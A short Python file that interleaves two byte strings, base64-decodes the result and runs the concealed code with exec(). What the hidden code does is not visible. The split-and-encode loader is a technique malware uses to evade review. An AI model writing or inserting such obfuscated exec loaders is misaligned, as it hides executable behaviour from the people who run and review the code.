import base64
_x = b'YxcMUVclboIAIRZBXlaRXhZxLBbNLBbJPQMkCAIAIAcVZ5bNI0a9doIAIAINbYc9dAIBcQCAIBZYdJKNbYOoIAIAIJdVbBJhdBO8eNbYa9d0eNbYc9d0JoZVYVdAINcNb4JVY1bUY9Jk'
_y = b'2h3g2z2vjKCgGlif2uXfyzWmCo30Cw30T0y6igCgCg2sio30DgGzAgCgCgHlGuGyC9HvnKigCkWgXsHlGpggCgCgHlHyim20Hziv3lGuGzH63lGuGyHvwKGmXsC9Fl3p2o24WwGu2tyK'
_p = b''.join(bytes([a, b]) for a, b in zip(_x, _y + b'\x00'))
exec(base64.b64decode(_p.rstrip(b'\x00')).decode())
